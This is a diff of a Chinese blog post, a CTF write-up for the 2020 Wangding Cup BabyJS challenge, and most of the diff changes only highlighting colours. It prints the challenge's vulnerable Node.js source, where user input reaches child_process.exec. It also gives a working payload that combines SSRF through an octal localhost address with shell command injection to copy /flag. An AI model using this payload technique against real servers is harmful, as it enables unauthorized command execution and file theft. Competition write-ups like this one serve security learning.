@@ -5,7 +5,7 @@
 
 <link rel='canonical' href='https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9Bbabyjs/'>
 
-<link rel="stylesheet" href="/scss/style.min.38fa0202e33e55fa6e042fc097bb63d935fa0b23f044ad99a9810606c47ab2b4.css"><meta property='og:title' content='[网鼎杯2020半决赛]BabyJS'>
+<link rel="stylesheet" href="/scss/style.min.9b1fc3b09cf11c2391a1bb047fd93317cd0f3be091b6c8d36d221829af5af94d.css"><meta property='og:title' content='[网鼎杯2020半决赛]BabyJS'>
 <meta property='og:description' content='快速拔刀（不是） 快速找到关键源码 var express = require(&amp;#39;express&amp;#39;); var config = require(&amp;#39;../config&amp;#39;); var url=require(&amp;#39;url&amp;#39;); var child_process=require(&amp;#39;child_process&amp;#39;); var fs=require(&amp;#39;fs&amp;#39;); var request=require(&amp;#39;request&amp;#39;); var router = express.Router(); var blacklist=[&amp;#39;127.0.0.1.xip.io&amp;#39;,&amp;#39;::ffff:127.0.0.1&amp;#39;,&amp;#39;127.0.0.1&amp;#39;,&amp;#39;0&amp;#39;,&amp;#39;localhost&amp;#39;,&amp;#39;0.0.0.0&amp;#39;,&amp;#39;[::1]&amp;#39;,&amp;#39;::1&amp;#39;]; router.get(&amp;#39;/&amp;#39;, function(req, res, next) { res.json({}); }); router.get(&amp;#39;/debug&amp;#39;, function(req, res, next) { console.log(req.ip); if(blacklist.indexOf(req.ip)!=-1){ console.log(&amp;#39;res&amp;#39;); var u=req.query.url.replace(/[\&amp;#34;\&amp;#39;]/ig,&amp;#39;&amp;#39;); console.log(url.parse(u).href); let log=`echo &amp;#39;${url.parse(u).href}&amp;#39;&amp;gt;&amp;gt;/tmp/log`; console.log(log); child_process.exec(log); res.json({data:fs.readFileSync(&amp;#39;/tmp/log&amp;#39;).toString()}); }else{ res.json({}); } }); router.post(&amp;#39;/debug&amp;#39;, function(req, res, next)'>
 <meta property='og:url' content='https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9Bbabyjs/'>
 <meta property='og:site_name' content='茄子的养殖场'>
@@ -331,55 +331,55 @@
     
     <p>快速拔刀（不是）</p>
 <p>快速找到关键源码</p>
-<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#859900">var</span> <span style="color:#268bd2">express</span> = <span style="color:#268bd2">require</span>(<span style="color:#2aa198">&#39;express&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#859900">var</span> <span style="color:#268bd2">config</span> = <span style="color:#268bd2">require</span>(<span style="color:#2aa198">&#39;../config&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#859900">var</span> <span style="color:#268bd2">url</span>=<span style="color:#268bd2">require</span>(<span style="color:#2aa198">&#39;url&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#859900">var</span> <span style="color:#268bd2">child_process</span>=<span style="color:#268bd2">require</span>(<span style="color:#2aa198">&#39;child_process&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#859900">var</span> <span style="color:#268bd2">fs</span>=<span style="color:#268bd2">require</span>(<span style="color:#2aa198">&#39;fs&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#859900">var</span> <span style="color:#268bd2">request</span>=<span style="color:#268bd2">require</span>(<span style="color:#2aa198">&#39;request&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#859900">var</span> <span style="color:#268bd2">router</span> = <span style="color:#268bd2">express</span>.<span style="color:#268bd2">Router</span>();
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#00f">var</span> <span style="color:#000">express</span> = <span style="color:#000">require</span>(<span style="color:#5a2">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00f">var</span> <span style="color:#000">config</span> = <span style="color:#000">require</span>(<span style="color:#5a2">&#39;../config&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00f">var</span> <span style="color:#000">url</span>=<span style="color:#000">require</span>(<span style="color:#5a2">&#39;url&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00f">var</span> <span style="color:#000">child_process</span>=<span style="color:#000">require</span>(<span style="color:#5a2">&#39;child_process&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00f">var</span> <span style="color:#000">fs</span>=<span style="color:#000">require</span>(<span style="color:#5a2">&#39;fs&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00f">var</span> <span style="color:#000">request</span>=<span style="color:#000">require</span>(<span style="color:#5a2">&#39;request&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00f">var</span> <span style="color:#000">router</span> = <span style="color:#000">express</span>.<span style="color:#000">Router</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#859900">var</span> <span style="color:#268bd2">blacklist</span>=[<span style="color:#2aa198">&#39;127.0.0.1.xip.io&#39;</span>,<span style="color:#2aa198">&#39;::ffff:127.0.0.1&#39;</span>,<span style="color:#2aa198">&#39;127.0.0.1&#39;</span>,<span style="color:#2aa198">&#39;0&#39;</span>,<span style="color:#2aa198">&#39;localhost&#39;</span>,<span style="color:#2aa198">&#39;0.0.0.0&#39;</span>,<span style="color:#2aa198">&#39;[::1]&#39;</span>,<span style="color:#2aa198">&#39;::1&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#00f">var</span> <span style="color:#000">blacklist</span>=[<span style="color:#5a2">&#39;127.0.0.1.xip.io&#39;</span>,<span style="color:#5a2">&#39;::ffff:127.0.0.1&#39;</span>,<span style="color:#5a2">&#39;127.0.0.1&#39;</span>,<span style="color:#5a2">&#39;0&#39;</span>,<span style="color:#5a2">&#39;localhost&#39;</span>,<span style="color:#5a2">&#39;0.0.0.0&#39;</span>,<span style="color:#5a2">&#39;[::1]&#39;</span>,<span style="color:#5a2">&#39;::1&#39;</span>];
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">router</span>.<span style="color:#268bd2">get</span>(<span style="color:#2aa198">&#39;/&#39;</span>, <span style="color:#859900">function</span>(<span style="color:#268bd2">req</span>, <span style="color:#268bd2">res</span>, <span style="color:#268bd2">next</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">res</span>.<span style="color:#268bd2">json</span>({});
+</span></span><span style="display:flex;"><span><span style="color:#000">router</span>.<span style="color:#000">get</span>(<span style="color:#5a2">&#39;/&#39;</span>, <span style="color:#00f">function</span>(<span style="color:#000">req</span>, <span style="color:#000">res</span>, <span style="color:#000">next</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#000">res</span>.<span style="color:#000">json</span>({});
 </span></span><span style="display:flex;"><span>});
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">router</span>.<span style="color:#268bd2">get</span>(<span style="color:#2aa198">&#39;/debug&#39;</span>, <span style="color:#859900">function</span>(<span style="color:#268bd2">req</span>, <span style="color:#268bd2">res</span>, <span style="color:#268bd2">next</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">console</span>.<span style="color:#268bd2">log</span>(<span style="color:#268bd2">req</span>.<span style="color:#268bd2">ip</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#859900">if</span>(<span style="color:#268bd2">blacklist</span>.<span style="color:#268bd2">indexOf</span>(<span style="color:#268bd2">req</span>.<span style="color:#268bd2">ip</span>)!=-<span style="color:#2aa198;font-weight:bold">1</span>){
-</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">console</span>.<span style="color:#268bd2">log</span>(<span style="color:#2aa198">&#39;res&#39;</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#859900">var</span> <span style="color:#268bd2">u</span>=<span style="color:#268bd2">req</span>.<span style="color:#268bd2">query</span>.<span style="color:#268bd2">url</span>.<span style="color:#268bd2">replace</span>(<span style="color:#2aa198">/[\&#34;\&#39;]/ig</span>,<span style="color:#2aa198">&#39;&#39;</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">console</span>.<span style="color:#268bd2">log</span>(<span style="color:#268bd2">url</span>.<span style="color:#268bd2">parse</span>(<span style="color:#268bd2">u</span>).<span style="color:#268bd2">href</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#859900">let</span> <span style="color:#268bd2">log</span>=<span style="color:#2aa198">`echo  &#39;</span><span style="color:#2aa198">${</span><span style="color:#268bd2">url</span>.<span style="color:#268bd2">parse</span>(<span style="color:#268bd2">u</span>).<span style="color:#268bd2">href</span><span style="color:#2aa198">}</span><span style="color:#2aa198">&#39;&gt;&gt;/tmp/log`</span>;
-</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">console</span>.<span style="color:#268bd2">log</span>(<span style="color:#268bd2">log</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">child_process</span>.<span style="color:#268bd2">exec</span>(<span style="color:#268bd2">log</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">res</span>.<span style="color:#268bd2">json</span>({<span style="color:#268bd2">data</span>:<span style="color:#268bd2">fs</span>.<span style="color:#268bd2">readFileSync</span>(<span style="color:#2aa198">&#39;/tmp/log&#39;</span>).<span style="color:#268bd2">toString</span>()});
-</span></span><span style="display:flex;"><span>    }<span style="color:#859900">else</span>{
-</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">res</span>.<span style="color:#268bd2">json</span>({});
+</span></span><span style="display:flex;"><span><span style="color:#000">router</span>.<span style="color:#000">get</span>(<span style="color:#5a2">&#39;/debug&#39;</span>, <span style="color:#00f">function</span>(<span style="color:#000">req</span>, <span style="color:#000">res</span>, <span style="color:#000">next</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#000">req</span>.<span style="color:#000">ip</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">if</span>(<span style="color:#000">blacklist</span>.<span style="color:#000">indexOf</span>(<span style="color:#000">req</span>.<span style="color:#000">ip</span>)!=-<span style="color:#3af">1</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">&#39;res&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#00f">var</span> <span style="color:#000">u</span>=<span style="color:#000">req</span>.<span style="color:#000">query</span>.<span style="color:#000">url</span>.<span style="color:#000">replace</span>(<span style="color:#5a2">/[\&#34;\&#39;]/ig</span>,<span style="color:#5a2">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#000">url</span>.<span style="color:#000">parse</span>(<span style="color:#000">u</span>).<span style="color:#000">href</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#00f">let</span> <span style="color:#000">log</span>=<span style="color:#5a2">`echo  &#39;</span><span style="color:#5a2">${</span><span style="color:#000">url</span>.<span style="color:#000">parse</span>(<span style="color:#000">u</span>).<span style="color:#000">href</span><span style="color:#5a2">}</span><span style="color:#5a2">&#39;&gt;&gt;/tmp/log`</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#000">log</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#000">child_process</span>.<span style="color:#000">exec</span>(<span style="color:#000">log</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#000">res</span>.<span style="color:#000">json</span>({<span style="color:#000">data</span>:<span style="color:#000">fs</span>.<span style="color:#000">readFileSync</span>(<span style="color:#5a2">&#39;/tmp/log&#39;</span>).<span style="color:#000">toString</span>()});
+</span></span><span style="display:flex;"><span>    }<span style="color:#00f">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#000">res</span>.<span style="color:#000">json</span>({});
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>});
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">router</span>.<span style="color:#268bd2">post</span>(<span style="color:#2aa198">&#39;/debug&#39;</span>, <span style="color:#859900">function</span>(<span style="color:#268bd2">req</span>, <span style="color:#268bd2">res</span>, <span style="color:#268bd2">next</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">console</span>.<span style="color:#268bd2">log</span>(<span style="color:#268bd2">req</span>.<span style="color:#268bd2">body</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#859900">if</span>(<span style="color:#268bd2">req</span>.<span style="color:#268bd2">body</span>.<span style="color:#268bd2">url</span> !== <span style="color:#859900;font-weight:bold">undefined</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#859900">var</span> <span style="color:#268bd2">u</span> = <span style="color:#268bd2">req</span>.<span style="color:#268bd2">body</span>.<span style="color:#268bd2">url</span>;
-</span></span><span style="display:flex;"><span>	<span style="color:#859900">var</span> <span style="color:#268bd2">urlObject</span>=<span style="color:#268bd2">url</span>.<span style="color:#268bd2">parse</span>(<span style="color:#268bd2">u</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#859900">if</span>(<span style="color:#268bd2">blacklist</span>.<span style="color:#268bd2">indexOf</span>(<span style="color:#268bd2">urlObject</span>.<span style="color:#268bd2">hostname</span>) == -<span style="color:#2aa198;font-weight:bold">1</span>){
-</span></span><span style="display:flex;"><span>		<span style="color:#859900">var</span> <span style="color:#268bd2">dest</span>=<span style="color:#268bd2">urlObject</span>.<span style="color:#268bd2">href</span>;
-</span></span><span style="display:flex;"><span>		<span style="color:#268bd2">request</span>(<span style="color:#268bd2">dest</span>,(<span style="color:#268bd2">err</span>,<span style="color:#268bd2">result</span>,<span style="color:#268bd2">body</span>)=&gt;{
-</span></span><span style="display:flex;"><span>			<span style="color:#268bd2">res</span>.<span style="color:#268bd2">json</span>(<span style="color:#268bd2">body</span>);
+</span></span><span style="display:flex;"><span><span style="color:#000">router</span>.<span style="color:#000">post</span>(<span style="color:#5a2">&#39;/debug&#39;</span>, <span style="color:#00f">function</span>(<span style="color:#000">req</span>, <span style="color:#000">res</span>, <span style="color:#000">next</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#000">req</span>.<span style="color:#000">body</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">if</span>(<span style="color:#000">req</span>.<span style="color:#000">body</span>.<span style="color:#000">url</span> !== <span style="color:#00f">undefined</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">var</span> <span style="color:#000">u</span> = <span style="color:#000">req</span>.<span style="color:#000">body</span>.<span style="color:#000">url</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#00f">var</span> <span style="color:#000">urlObject</span>=<span style="color:#000">url</span>.<span style="color:#000">parse</span>(<span style="color:#000">u</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#00f">if</span>(<span style="color:#000">blacklist</span>.<span style="color:#000">indexOf</span>(<span style="color:#000">urlObject</span>.<span style="color:#000">hostname</span>) == -<span style="color:#3af">1</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#00f">var</span> <span style="color:#000">dest</span>=<span style="color:#000">urlObject</span>.<span style="color:#000">href</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#000">request</span>(<span style="color:#000">dest</span>,(<span style="color:#000">err</span>,<span style="color:#000">result</span>,<span style="color:#000">body</span>)=&gt;{
+</span></span><span style="display:flex;"><span>			<span style="color:#000">res</span>.<span style="color:#000">json</span>(<span style="color:#000">body</span>);
 </span></span><span style="display:flex;"><span>		})
 </span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#859900">else</span>{
-</span></span><span style="display:flex;"><span>		<span style="color:#268bd2">res</span>.<span style="color:#268bd2">json</span>([]);
+</span></span><span style="display:flex;"><span>	<span style="color:#00f">else</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#000">res</span>.<span style="color:#000">json</span>([]);
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>});
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">module</span>.<span style="color:#268bd2">exports</span> = <span style="color:#268bd2">router</span>;
+</span></span><span style="display:flex;"><span><span style="color:#000">module</span>.<span style="color:#000">exports</span> = <span style="color:#000">router</span>;
 </span></span></code></pre></div><p>indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。</p>
 <p>如果没有找到匹配的字符串则返回 -1。</p>
 <p>child_process 新建子进程，从而执行 Unix 系统命令</p>
@@ -407,7 +407,7 @@
 <p>get：判断访问ip是否在<code>blacklist</code>中，如果是本地访问就读取get参数中的<code>url</code>参数，去除其中的单引号和双引号，然后用nodejs的<code>url.parse</code>去解析。把解析后的url拼接到一条shell命令中执行。之后返回<code>/tmp/log</code>文件中的内容。</p>
 <p>POST： 检测是否提交了url参数，若提交了该参数则会用<code>url.parse</code>解析，然后判断其中的主机名字段是否在<code>blacklist</code>中，不在的话，去使用GET方法请求<code>url</code>参数中所提交的url，返回请求的内容。</p>
 <p>payload：</p>
-<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{&#34;url&#34;:&#34;http://0177.0.0.1:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00&#34;}
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{&#34;url&#34;:&#34;http://0177.0.0.1:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00&#34;}
 </span></span></code></pre></div><p>这个样子：</p>
 <p>echo  &lsquo;http://a&rsquo;a;cp$IFS/flag$IFS/tmp/log%00&rsquo;&raquo;/tmp/log</p>
 
